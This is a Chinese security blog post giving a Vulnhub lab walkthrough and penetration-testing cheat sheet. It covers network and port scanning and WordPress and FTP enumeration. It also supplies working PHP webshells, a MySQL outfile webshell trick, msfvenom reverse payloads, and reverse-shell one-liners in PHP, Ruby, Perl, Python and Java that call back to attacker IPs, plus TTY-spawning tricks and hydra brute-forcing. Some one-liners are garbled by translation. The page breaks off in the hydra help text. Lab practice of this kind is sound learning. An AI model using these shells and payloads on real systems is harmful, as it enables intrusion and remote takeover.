<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="initial-scale=1.0,user-scalable=no,maximum-scale=1,width=device-width">
    <title>如何从Vulnhub上面的镜像挖掘漏洞 | MottoIN</title>
    <link rel='dns-prefetch' href='//www.mottoin.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="MottoIN &raquo; 如何从Vulnhub上面的镜像挖掘漏洞评论Feed" href="http://www.mottoin.com/97936.html/feed" />
<link rel='stylesheet' id='stylesheet-css'  href='http://www.mottoin.com/wp-content/themes/JustNews/css/style.css?ver=2.3.2' type='text/css' media='all' />
<link rel='stylesheet' id='wpcom-qa-css'  href='http://www.mottoin.com/wp-content/plugins/wpcom-qa/css/style.css?ver=1.0' type='text/css' media='all' />
<style id='wpcom-qa-inline-css' type='text/css'>

        .q-content .topic-tab,.q-content .q-answer .as-user,.q-content .q-answer .as-comment-name{color: #1471CA;}
        .q-content .q-topic-wrap a:hover,.q-content .q-answer .as-action a:hover,.q-content .topic-tab:hover{color:#0D62B3;}
        .q-content .put-top,.q-content .topic-tab.current-tab,.q-content .q-answer .as-submit .btn-submit,.q-content .q-answer .as-comments-submit,.q-content .q-add-header .btn-post,.q-content .q-pagination .current{background-color:#1471CA;}
        .q-content .q-answer .as-submit .btn-submit:hover,.q-content .q-answer .as-comments-submit:hover,.q-content .q-add-header .btn-post:hover,.q-content .topic-tab.current-tab:hover,.q-content .q-pagination a:hover{background-color:#0D62B3;}
        .q-content .q-answer .as-comments-input:focus{border-color: #1471CA;}
        
</style>
<link rel='stylesheet' id='um_minified-css'  href='http://www.mottoin.com/wp-content/plugins/ultimate-member/assets/css/um.min.css?ver=10.3.88' type='text/css' media='all' />
<script type='text/javascript' src='http://www.mottoin.com/wp-content/themes/JustNews/js/jquery.min.js?ver=1.12.4'></script>
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.mottoin.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.mottoin.com/wp-includes/wlwmanifest.xml" /> 
<link rel='prev' title='小白客带你走进黑客世界之web应用安全历史' href='http://www.mottoin.com/98061.html' />
<link rel='next' title='Android 字符串及字典混淆开源实现' href='http://www.mottoin.com/98104.html' />
<link rel='shortlink' href='http://www.mottoin.com/?p=97936' />
<!--  WPCOM主题相关信息开始 -->
<meta name="applicable-device" content="pc,mobile">
<meta http-equiv="Cache-Control" content="no-transform">
<meta name="keywords" content="ctf,shell,Vulnhub,扫描,漏洞,镜像">
<meta name="description" content="这个帖子标记了通过做VulnHub提供的易受攻击的机器收集的学习。从网站下载虚拟机并在VMware或VirtualBox中运行虚拟机后，可以按照以下步骤查找漏洞。查找IP地址1.Netdiscover：主动/被动arp侦察工具netdiscover[options]-iinterface:Thenetworkinterfacetosniffandinjectpackets.-rrange:Scan">
<!--  WPCOM主题相关信息结束 -->
 
		<script type="text/javascript">

		var ultimatemember_image_upload_url = 'http://www.mottoin.com/wp-content/plugins/ultimate-member/core/lib/upload/um-image-upload.php';
		var ultimatemember_file_upload_url = 'http://www.mottoin.com/wp-content/plugins/ultimate-member/core/lib/upload/um-file-upload.php';
		var ultimatemember_ajax_url = 'http://www.mottoin.com/wp-admin/admin-ajax.php';

		</script>

	
		<style type="text/css">.request_name { display: none !important; }</style>

	<link rel="icon" href="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-32x32.jpg" sizes="32x32" />
<link rel="icon" href="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-192x192.jpg" sizes="192x192" />
<link rel="apple-touch-icon-precomposed" href="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-180x180.jpg" />
<meta name="msapplication-TileImage" content="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-270x270.jpg" />
    <style>
                a,.sec-panel-head span,.list.tabs .tab.active a,.header .nav>li.active>a,.header .dropdown-menu>.active>a,.entry .entry-info .nickname,.entry-bar-inner .author-title,.entry-action .btn-zan,.entry-action .btn-dashang,.comment-body .nickname,.form-submit-text span,.widget_profile .author-title,.um .um-profile-body .um-item-meta a,.login-modal-body .btn-register{color: #08c;}
        .header .dropdown-menu>li>a:hover,.header .dropdown-menu>.active>a:hover,.header .dropdown-menu>.active>a:focus,.navbar-action .publish,.pagination .current,.flex-control-paging li a.flex-active,.form-submit .submit,.sidebar .widget_nav_menu ul li.current-menu-item a,.sidebar .widget_nav_menu ul li.current-post-parent a,.search-form input.submit,.action .contact-title,.pf-submit,.tagHandler ul.tagHandlerContainer li.tagItem,.login-modal-body .btn-login,.woocommerce a.button,.woocommerce button.button,.woocommerce input.button,.woocommerce a.button.alt,.woocommerce button.button.alt,.woocommerce input.button.alt,.woocommerce a.button.alt.disabled,.woocommerce a.button.alt.disabled:hover,.woocommerce a.button.alt:disabled,.woocommerce a.button.alt:disabled:hover,.woocommerce a.button.alt:disabled[disabled],.woocommerce a.button.alt:disabled[disabled]:hover,.woocommerce button.button.alt.disabled,.woocommerce button.button.alt.disabled:hover,.woocommerce button.button.alt:disabled,.woocommerce button.button.alt:disabled:hover,.woocommerce button.button.alt:disabled[disabled],.woocommerce button.button.alt:disabled[disabled]:hover,.woocommerce input.button.alt.disabled,.woocommerce input.button.alt.disabled:hover,.woocommerce input.button.alt:disabled,.woocommerce input.button.alt:disabled:hover,.woocommerce input.button.alt:disabled[disabled],.woocommerce input.button.alt:disabled[disabled]:hover,.woocommerce .widget_price_filter .ui-slider .ui-slider-handle,.woocommerce .widget_price_filter .ui-slider .ui-slider-range,.shopping-count,.social-login-form .sl-input-submit{background-color: #08c;}
        .entry .entry-content h3,.entry .entry-content .h3,.widget-title{border-left-color: #08c;}
        .entry-bar-inner .author-title,.entry-action .btn-zan,.entry-action .btn-dashang,.search-form input.keyword:focus,.widget_profile .author-title,.login-modal-body .btn-login,.login-modal-body .btn-register{border-color: #08c;}
        .entry-bar-inner .author-title:before,.widget_profile .author-title:before{border-right-color: #08c;}
        .list.tabs .tab.active a{border-bottom-color: #08c;}

        a:hover,.header .nav>li>a:hover,.header .nav>li.active>a,.navbar-action .login:hover,.navbar-action .login:focus,.navbar-action .profile a:hover,.navbar-search-icon:hover,.navbar-search-icon:focus,.entry .entry-info a:hover,.entry .entry-info a:focus,.entry-bar .info-item a:hover,.p-item-wrap:hover .title a,.special-item-title a:hover,.special-item-bottom a:hover,.widget ul a:hover,.widget ol a:hover,.sec-panel-head .more:hover,.topic-list .topic-wrap:hover span,.tabs .tab a:hover,
        .article-list .item-title a:hover,.article-list .item-meta a:hover,.article-list .item-meta a:focus,.list-links a:hover,.list-links a:focus,.um .um-profile-body .um-item-meta a:hover,.um .um-profile-body .um-item-link a:hover,.load-more:hover,.login-modal-body .btn-register:hover{color: #07c;}
        .navbar-action .publish:hover,.navbar-action .publish:focus,.entry-tag a:hover,.entry-tag a:focus,.entry-action .btn-zan:hover,.entry-action .btn-dashang:hover,.entry-action .btn-zan.liked,.pagination a:hover,.flex-control-paging li a:hover,.form-submit .submit:hover,.widget .tagcloud a:hover,.sidebar .widget_nav_menu ul li.current-menu-item .sub-menu a:hover,.sidebar .widget_nav_menu ul li.current-post-parent .sub-menu a:hover,.sidebar .widget_nav_menu ul li a:hover,.search-form input.submit:hover,.action .a-box:hover,.footer-sns .fa:after,.article-list .item-category:hover,.pf-submit:hover,.tagHandler ul.tagHandlerContainer li.tagItem:hover,.login-modal-body .btn-login:hover,.woocommerce a.button:hover,.woocommerce button.button:hover,.woocommerce input.button:hover,.woocommerce a.button.alt:hover,.woocommerce button.button.alt:hover,.woocommerce input.button.alt:hover,.woocommerce .widget_price_filter .price_slider_wrapper .ui-widget-content,.social-login-form .sl-input-submit:hover{background-color: #07c;}
        .entry-tag a:hover,.entry-tag a:focus,.entry-action .btn-zan:hover,.entry-action .btn-dashang:hover,.entry-action .btn-zan.liked,.widget .tagcloud a:hover,.load-more:hover,.login-modal-body .btn-login:hover,.login-modal-body .btn-register:hover{border-color: #07c;}
        .special-item-bottom a:hover:before{border-left-color: #07c;}
        .list.tabs .tab.active a:hover{border-bottom-color: #07c;}
        @media (max-width: 991px){
            .header .navbar-nav>li.active>a,.header .navbar-nav .dropdown-menu .active a,.header .navbar-nav .dropdown-menu .active .dropdown-menu .active a{color: #08c;}
            .navbar-collapse{background-color: #08c;}
            .dropdown-menu>li a{border-color: #07c;}
            .header .navbar-nav>li.active>a:hover,.header .navbar-nav>li a:hover,.header .navbar-nav .dropdown-menu .active a:hover,.header .navbar-nav .dropdown-menu .active .dropdown-menu a:hover,.header .navbar-nav .dropdown-menu li a:hover{color: #07c;}
        }
        .j-share{position: fixed!important;top: 50%!important;}
                .header .logo img{max-height: 32px;}
                @media (max-width: 767px){
            .header .logo img{max-height: 26px;}
        }
                        .btn-post{
    display: block;
    margin: 0 auto;
    padding: 15px 20px;
    font-size: 16px;
    text-align: center;
    color: #fff !important;
    line-height: 1;
    background: #1471CA;
    -webkit-border-radius: 3px;
    border-radius: 3px;
    text-decoration: none;
    border: 0;
    outline: 0;
}    </style>
    <script> (function() {if (!/*@cc_on!@*/0) return;var e = "abbr, article, aside, audio, canvas, datalist, details, dialog, eventsource, figure, footer, header, hgroup, mark, menu, meter, nav, output, progress, section, time, video".split(', ');var i= e.length; while (i--){ document.createElement(e[i]) } })()</script>
    <!--[if lte IE 8]><script src="http://www.mottoin.com/wp-content/themes/JustNews/js/respond.min.js"></script><![endif]-->
</head>
<body class="post-template-default single single-post postid-97936 single-format-standard">
<header class="header">
    <div class="container clearfix">
        <div class="navbar-header">
            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target=".navbar-collapse">
                <span class="icon-bar icon-bar-1"></span>
                <span class="icon-bar icon-bar-2"></span>
                <span class="icon-bar icon-bar-3"></span>
            </button>
            <a class="logo" href="http://www.mottoin.com"><img src="http://www.mottoin.com/img/mottoin/logo.png" alt="MottoIN"></a>
        </div>
        <div class="collapse navbar-collapse">
            <nav class="navbar-left primary-menu"><ul id="menu-%e5%af%bc%e8%88%aa" class="nav navbar-nav"><li class="menu-item menu-item-home"><a href="http://www.mottoin.com/">首页</a></li>
<li class="menu-item"><a href="http://www.mottoin.com/category/news">资讯</a></li>
<li class="menu-item dropdown"><a href="http://www.mottoin.com/category/article" class="dropdown-toggle">文章</a>
<ul role="menu" class=" dropdown-menu">
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/web">Web安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/system">系统安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/network">网络安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/terminal">终端安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/database">数据安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/wireless">无线安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/social">社会工程</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/intranet">内网渗透</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/code">代码审计</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/reverse">逆向破解</a></li>
</ul>
</li>
<li class="menu-item"><a href="http://www.mottoin.com/category/tools">工具</a></li>
<li class="menu-item"><a href="http://www.mottoin.com/category/geek">极客</a></li>
<li class="menu-item dropdown"><a href="http://www.mottoin.com/category/sole" class="dropdown-toggle">独家</a>
<ul role="menu" class=" dropdown-menu">
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/topic">专题</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/people">人物</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/view">观点</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/events">活动</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/video">视频</a></li>
</ul>
</li>
<li class="menu-item"><a href="http://www.mottoin.com/category/hr">招聘</a></li>
<li class="menu-item"><a href="http://www.mottoin.com/forum">社区</a></li>
</ul></nav>            <div class="navbar-action pull-right">

                                    <form class="navbar-search" action="http://www.mottoin.com" method="get" role="search">
                        <input type="text" name="s" class="navbar-search-input" autocomplete="off" placeholder="输入关键词搜索..." value="">
                        <a class="navbar-search-icon j-navbar-search" href="javascript:;"></a>
                    </form>

                    
                    <div id="j-user-wrap">
                        <a class="login" href="http://www.mottoin.com/login">登录</a>
                        <a class="login" href="http://www.mottoin.com/register">注册</a>
                    </div>
                    <a class="publish" href="http://www.mottoin.com/post">
                        投稿</a>
                                                </div>
        </div><!-- /.navbar-collapse -->
    </div><!-- /.container -->
</header>
<div id="wrap">    <div class="main container">
        <div class="content">
                            <article id="post-97936" class="post-97936 post type-post status-publish format-standard has-post-thumbnail hentry category-ctf tag-ctf tag-shell tag-vulnhub tag-469 tag-41 tag-2926">
                    <div class="entry">
                        <div class="entry-head">
                            <h1 class="entry-title">如何从Vulnhub上面的镜像挖掘漏洞</h1>
                            <div class="entry-info">
                                                                <a class="nickname" href="http://www.mottoin.com/user/mottoin_x/">Stbird</a>
                                <span class="dot">•</span>
                                <span>2017年3月8日</span>
                                <span class="dot">•</span>
                                <a href="http://www.mottoin.com/category/ctf" rel="category tag">CTF</a>                                                                    <span class="dot">•</span>
                                    <span>阅读 544</span>
                                                            </div>
                        </div>
                                                                        <div class="entry-content clearfix">
                            <p>这个帖子标记了通过做VulnHub提供的易受攻击的机器收集的学习。从网站下载虚拟机并在VMware或Virtual Box中运行虚拟机后，可以按照以下步骤查找漏洞。</p>
<h2>查找IP地址</h2>
<p><strong>1.Netdiscover：主动/被动arp侦察工具</strong></p>
<pre>netdiscover [options]
-i interface : The network interface to sniff and inject packets.
-r range : Scan a given range instead of auto scan.

Example:
netdiscover -i eth0/wlan0/vboxnet0/vmnet1 -r 192.168.1.0/24</pre>
<p>虚拟化软件的接口名称</p>
<ul>
<li>Virtualbox：vboxnet</li>
<li>Vmware：vmnet</li>
</ul>
<p><strong>2.Nmap：网络探索工具和安全/端口扫描器</strong></p>
<pre>nmap [Scan Type] [Options] {target specification}
-sP/-sn Ping Scan -disable port scan

Example: nmap -sP/-sn 192.168.1.0/24</pre>
<h2>端口扫描</h2>
<p>端口扫描提供大量有关开放服务的信息以及针对这些服务的可能漏洞。两个选项</p>
<ul>
<li>Unicornscan：端口扫描器，利用它自己的用户态TCP / IP堆栈，它允许运行异步扫描。比nmap更快，可以在相对较短的时间内扫描65,535个端口。</li>
</ul>
<pre>unicornscan [options] X.X.X.X/YY:S-E
  -i, --interface : interface name, like eth0 or fxp1, not normally required
  -m, --mode : scan mode, tcp (syn) scan is default, U for udp T for tcp \`sf' for tcp connect scan and 
A for arp for -mT you can also specify tcp flags following the T like -mTsFpU for example that would 
send tcp syn packets with (NO Syn\|FIN\|NO Push\|URG)
  Address ranges are cidr like 1.2.3.4/8 for all of 1.?.?.?, if you omit the cidr mask then /32 is implied.
  Port ranges are like 1-4096 with 53 only scanning one port, a for all 65k and p for 1-1024

   example: unicornscan 192.168.1.5:1-4000 gateway:a would scan port 1 - 4000 for 192.168.1.5 and all 
65K ports for gateway.
</pre>
<ul class="simple">
<li>Nmap：网络探索工具和安全/端口扫描器</li>
</ul>
<pre>nmap [Scan Type] [Options] {target specification}

HOST DISCOVERY:
-sL: List Scan - simply list targets to scan
-sn: Ping Scan - disable port scan
-Pn: Treat all hosts as online -- skip host discovery

SCAN TECHNIQUES:
-sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
-sU: UDP Scan -sN/sF/sX: TCP Null, FIN, and Xmas scans

PORT SPECIFICATION:
-p : Only scan specified ports
Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9

SERVICE/VERSION DETECTION:
-sV: Probe open ports to determine service/version info

OUTPUT:
-oN/-oX/-oS/-oG : Output scan in normal, XML,Output in the three major formats at once
-v: Increase verbosity level (use -vv or more for greater effect)

MISC: -6: Enable IPv6 scanning -A: Enable OS detection, version detection, script scanning, and traceroute</pre>
<p>由于unicornscan运行很快，使用它扫描大型网络或大量的端口是很好的一个选择。使用unicornscan扫描所有端口，并列出那些打开的端口，并将它们传递给nmap进行服务检测。superkojiman为此已经写了一个脚本在<a href="https://github.com/superkojiman/onetwopunch">GitHub</a>。</p>
<p>当端口扫描主机时，你将看到一个打开的端口列表。在许多情况下，端口号告诉你正在运行什么应用程序。端口25通常是SMTP，端口80主要是HTTP。但是，这并不一定是不变的，特别是当在处理非标准端口上运行的专有协议时，你无法确定正在运行的应用程序是什么。</p>
<p>通过使用<a href="https://www.thc.org/thc-amap/">Amap</a>，我们可以确定是否有SSL服务器在端口3445上运行，或者某些oracle监听器在端口23上运行。此外，如果你想要，它将实际上进行SSL连接，然后识别启用SSL的协议！vulnhub虚拟机可以在同一个端口上运行http和https。</p>
<pre>amap -A 192.168.1.2 12380 amap v5.4 (www.thc.org/thc-amap) started at 2016-08-10 05:48:09 - APPLICATION 
MAPPING mode
Protocol on 192.168.1.2:12380/tcp matches http
Protocol on 192.168.1.2:12380/tcp matches http-apache-2
Protocol on 192.168.1.2:12380/tcp matches ntp
Protocol on 192.168.1.2:12380/tcp matches ssl
Unidentified ports: none.
amap v5.4 finished at 2016-08-10 05:48:16</pre>
<h2>接口监听</h2>
<p>我们应该监听着VM所在的本地接口，例如vboxnet0或vmnet，使用wireshark或tcpdump。许多VM会随机发送数据，例如，在其中一个VM中，它执行arp扫描，并在端口4444上发送SYN数据包，如果有东西在该端口上侦听，它则发送数据。</p>
<pre>18:02:04.096292 IP 192.168.56.101.36327 &gt; 192.168.56.1.4444: Flags [S], seq 861815232, win 16384, options
 [mss 1460,nop,nop,sackOK,nop,wscale 3,nop,nop,TS val 4127458640 ecr 0], length 0
18:02:04.096330 IP 192.168.56.1.4444 &gt; 192.168.56.101.36327: Flags [R.], seq 0, ack 861815233, win 0, 
length 0
18:02:04.098567 ARP, Request who-has 192.168.56.2 tell 192.168.56.101, length 28
18:02:04.098584 ARP, Request who-has 192.168.56.2 tell 192.168.56.101, length 28
18:02:04.100756 ARP, Request who-has 192.168.56.3 tell 192.168.56.101, length 28
18:02:04.100773 ARP, Request who-has 192.168.56.3 tell 192.168.56.101, length 28
18:02:04.096292 IP 192.168.56.101.36327 &gt; 192.168.56.1.4444: Flags [S],</pre>
<p>在侦听端口4444上，我们收到一个base64编码的字符串</p>
<pre>nc -lvp 4444
listening on [any] 4444 …
192.168.56.101: inverse host lookup failed: Unknown host
connect to [192.168.56.1] from (UNKNOWN) [192.168.56.101] 39519
0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhb
GwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxh</pre>
<h2>从一无所有到一个非特权shell</h2>
<p>此时，你将了解系统上运行的不同服务和服务版本。</p>
<p><strong>1.searchsploit：利用数据库存档搜索。</strong></p>
<p>首先，我们需要检查操作系统是否有任何易受攻击的服务或漏洞利用。例如，一个容易受到从系统提取信息的VM之一中的 Webmin服务。</p>
<pre>root@kali:~# nmap -sV -A 172.16.73.128
**********Trimmed**************
10000/tcp open http MiniServ 0.01 (Webmin httpd)
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
| ndmp-version:
|_ ERROR: Failed to get host information from server
**********Trimmed**************</pre>
<p>如果我们在searchsploit中搜索webmin，我们会发现有不同的漏洞利用，我们只需使用基于实用程序和版本匹配的漏洞。</p>
<pre>root@kali:~# searchsploit webmin
**********Trimmed**************
Description                                                                  Path
----------------------------------------------------------------------------------------------------------------
Webmin &lt; 1.290 / Usermin &lt; 1.220 Arbitrary File Disclosure Exploit        | /multiple/remote/1997.php
Webmin &lt; 1.290 / Usermin &lt; 1.220 Arbitrary File Disclosure Exploit (perl) | /multiple/remote/2017.pl
Webmin 1.x HTML Email Command Execution Vulnerability | /cgi/webapps/24574.txt
**********Trimmed**************
*Insert searchsploit -xml options *</pre>
<p><strong>2.Webserver Opportunities</strong></p>
<p>如果Web服务器正在机器上运行，我们可以从运行开始</p>
<ul>
<li>whatweb可以找到什么服务器正在运行。此外，我们可以执行nikto，w3af找到漏洞。dirb可以找到隐藏的目录。</li>
<li>PUT方法：有时，它也是一个很好的选择，检查网站上提供的各种选项，如GET，PUT，DELETE等。</li>
</ul>
<p>Curl用于检查可用选项的命令：</p>
<pre>curl -X OPTIONS -v http://192.168.126.129/test/
Trying 192.168.126.129…
Connected to 192.168.126.129 (192.168.126.129) port 80 (#0)
&gt; OPTIONS /test/ HTTP/1.1
&gt; Host: 192.168.126.129
&gt; User-Agent: curl/7.47.0
&gt; Accept: /
&gt;
&lt; HTTP/1.1 200 OK
&lt; DAV: 1,2
&lt; MS-Author-Via: DAV
&lt; Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
&lt; Allow: OPTIONS, GET, HEAD, POST
&lt; Content-Length: 0
&lt; Date: Fri, 29 Apr 2016 09:41:19 GMT
&lt; Server: lighttpd/1.4.28
&lt;
* Connection #0 to host 192.168.126.129 left intact</pre>
<p>put方法允许你上传文件。最后，你可以上传一个可以作为shell的php文件。有多种方法来上传文件，如<span id="id2" class="problematic"><a href="http://bitvijays.github.io/LFFVulnhub.html#id1">“检测和利用HTTP Put方法”</a>或<a href="http://www.smeegesec.com/2014/10/detecting-and-exploiting-http-put-method.html">”检测和利用HTTP放置方法</a></span><span id="id2" class="problematic">中”所述。</span></p>
<p>或者也可以</p>
<ul class="simple">
<li>Nmap：</li>
</ul>
<pre>nmap -p 80 --script http-put --script-args http-put.url='/uploads/rootme.php',http-put.file='/tmp/rootme.php'</pre>
<ul>
<li>curl:</li>
</ul>
<pre>curl --upload-file test.txt -v --url http://192.168.126.129/test/test.txt</pre>
<ul>
<li>或者</li>
</ul>
<pre>curl -X PUT -d '</pre>
<ul class="simple">
<li>WordPress</li>
</ul>
<p>当运行wpscan时，还要确保运行-enumerate u枚举用户名。默认情况下wpscan不运行它。此外，扫描插件</p>
<pre>wpsscan
 --url | -u &lt;target url&gt; The WordPress URL/domain to scan.
 --force | -f Forces WPScan to not check if the remote site is running WordPress.
 --enumerate | -e [option(s)] Enumeration.
 option :
 u usernames from id 1 to 10
 u[10-20] usernames from id 10 to 20 (you must write [] chars)
 p plugins
 vp only vulnerable plugins
 ap all plugins (can take a long time)
 tt timthumbs
 t themes
 vt only vulnerable themes
 at all themes (can take a long time)
 Multiple values are allowed : "-e tt,p" will enumerate timthumbs and plugins
 If no option is supplied, the default is "vt,tt,u,vp"</pre>
<p>WordPress配置存储在wp-config.php中。如果你下载它，你可能会获得数据库的用户名和密码。我们也可以使用wordpress来强制用户名密码。</p>
<pre>wpscan --url http://192.168.1.2 --wordlist /home/bitvijays/Documents/Walkthru/Mr_Robot_1/test.txt 
--username elliot</pre>
<p>名称？可能的用户名？可能的密码？</p>
<p>有时，在访问Web服务器网页时（如果Vulnerable机器运行任何http / https网络服务器），你可以找到局域网内其他设备的名称。现在，通常的做法是根据你的姓名输入用户名。它可以基于可用的命名“namemash.py”，可以用于创建可能的用户名。但是，我们仍然有大量的用户名可以暴力破解密码。此外，如果易受攻击的机器正在运行SMTP邮件服务器，我们可以验证特定用户名是否存在，并修改namemash.py以生成该模式的用户名。</p>
<ul class="simple">
<li>使用metasploit smtp_enum模块：msfconsole运行时，请使用auxiliary / scanner / smtp / smtp_enum，输入RHOSTS（目标地址）和包含可能的用户帐户列表的USER FILE。</li>
<li>使用VRFY命令：</li>
<li>使用RCPT TO命令：</li>
</ul>
<p><strong>3.FTP Opportunities</strong></p>
<p>如果提供ftp匿名登录或你有登录详细信息，可以通过wget下载内容（对于不需要匿名登录用户密码）</p>
<pre>wget -rq ftp://IP --ftp-user=username --ftp-password=password</pre>
<p><strong>4.远程执行代码</strong></p>
<ul>
<li>MYSQL：如果我们有MYSQL Shell，我们可以使用mysql的outfile函数上传一个shell。</li>
</ul>
<pre>echo -n "&lt;?php phpinfo(); ?&gt;" | xxd -ps 3c3f70687020706870696e666f28293b203f3e
select 0x3c3f70687020706870696e666f28293b203f3e 
into outfile "/var/www/html/blogblog/wp-content/uploads/phpinfo.php"``</pre>
<p><strong>5.反向壳：主要取自PentestMonkey Reverse shell cheat sheet和HighOn.Coffee Reverse Shell cheat sheet</strong></p>
<ul class="simple">
<li>PHP：我们可以在服务器上创建一个新的文件（shell.php）</li>
</ul>
<pre>&lt;?php system($\_GET["cmd"]); ?&gt;

or

&lt;?php echo shell_exec($\_GET["cmd"]); ?&gt;</pre>
<p>可以通过访问</p>
<pre>http://IP/shell.php?cmd=id</pre>
<p>或者我们可以创建一个php meterpreter shell，在msf上运行一个exploit handler，上传有效负载到服务器并等待连接。</p>
<pre>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f raw -o /tmp/payload.php</pre>
<p>也可以用Weely生成一个webshell</p>
<pre>weevely generate password /tmp/payload.php</pre>
<p>通过调用</p>
<pre>weevely http://192.168.1.2/location_of_payload password</pre>
<p>但是，它不如php meterpreter或reverse shell有用。</p>
<ul class="simple">
<li>PHP Trick：在测试系统上工作这段代码假设TCP连接使用文件描述符3.。如果它不工作，请尝试4，5，6</li>
</ul>
<pre>php -r '$sock=fsockopen("192.168.56.101",1337);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</pre>
<p>以上可以通过使用nc在端口1337监听连接。</p>
<ul>
<li>Ruby:</li>
</ul>
<pre>ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</pre>
<ul class="simple">
<li>Perl：</li>
</ul>
<pre>perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");
exec("/bin/sh -i");};'</pre>
<ul class="simple">
<li>Python:</li>
</ul>
<pre>python -c'import socket，subprocess，os; s = socket.socket（socket.AF_INET，socket.SOCK_STREAM）; 
s.connect（（“10.0.0.1”，1234））; os.dup2（s.fileno ，0）; os.dup2（s.fileno（），1）;
os.dup2（s.fileno（），2）; 
p = subprocess.call（[“/ bin / sh”，“ - i”]）</pre>
<ul class="simple">
<li>Java:</li>
</ul>
<pre>r = Runtime.getRuntime （）
p = r.exec （[ “/ bin / bash”，“-c”，“exec 5 &lt;&gt; / dev / tcp / 10.0.0.1 / 2002; do \ $ line 2&gt;＆5&gt;＆5; done“ ] 
as String []） 
p.waitFor （）</pre>
<ul class="simple">
<li>JSP:</li>
</ul>
<pre>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.129 LPORT=4444 -f war &gt; runme.war</pre>
<ul class="simple">
<li>XTerm:</li>
</ul>
<p>反向shell的最简单形式之一是xterm会话。应在服务器上运行以下命令。它将尝试在TCP端口6001上连接回你（10.0.0.1）。</p>
<pre>xterm -display 10.0.0.1:1</pre>
<p>要捕获传入的xterm，启动一个X-Server (:1 – which listens on TCP port 6001)。一种方法是使用Xnest（在系统上运行）：</p>
<pre>Xnest :1</pre>
<p>你需要授权目标连接到你的计算机（命令也在你的主机上运行）：</p>
<pre>xhost +targetip</pre>
<p><strong>6.产生一个TTY Shell</strong></p>
<p>生成一个TTY Shell和Post-Exploitation Without A TTY提供了多种方法来获取tty shell</p>
<pre>python -c 'import pty; pty.spawn("/bin/sh")'</pre>
<p>或者</p>
<pre>python -c 'import pty; pty.spawn("/bin/bash")'</pre>
<pre>python -c 'import os; os.system("/bin/bash")'</pre>
<pre>/bin/sh -i</pre>
<pre>perl -e 'exec "/bin/sh";'</pre>
<pre>perl: exec "/bin/sh";</pre>
<pre>ruby: exec "/bin/sh"</pre>
<pre>lua: os.execute('/bin/sh')</pre>
<p>（从IRB内）</p>
<pre>exec "/bin/sh"</pre>
<p>（从vi内）</p>
<pre>:!bash</pre>
<p>（从vi内）</p>
<pre>:set shell=/bin/bash:shell</pre>
<p>（从nmap内）</p>
<pre>!sh</pre>
<p>使用“Expect”获取TTY</p>
<pre>$ cat sh.exp
 #!/usr/bin/expect
 # Spawn a shell, then allow the user to interact with it.
 # The new shell will have a good enough TTY to run tools like ssh, su and login
 spawn sh
 interact</pre>
<ul class="simple">
<li><strong>Brute forcing: hydra:</strong></li>
</ul>
<pre>-l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE
 -p PASS or -P FILE try password PASS, or load several passwords from FILE
 -U service module usage details
 -e nsr additional checks, "n" for null password, "s" try login as pass, "r" try the reverse login as pass</pre>
<p><strong>hydra http-post-form:</strong></p>
<pre>hydra -U http-post-form

Help for module http-post-form:
============================================================================
Module http-post-form requires the page and the parameters for the web form.

By default this module is configured to follow a maximum of 5 redirections in a row. It always 
gathers a new cookie from the same URL without variables. The parameters take three ":" separated 
values, plus optional values.

(Note: if you need a colon in the option string as value, escape it with "\:", but do not escape
 a "\" with "\\".)</pre>
<pre>Syntax: &lt;url&gt;:&lt;form parameters&gt;:&lt;condition string&gt;
[:&lt;optional&gt;[:&lt;optional&gt;]
First is the page on the server to GET or POST to (URL).
Second is the POST/GET variables (taken from either the browser, proxy, etc.
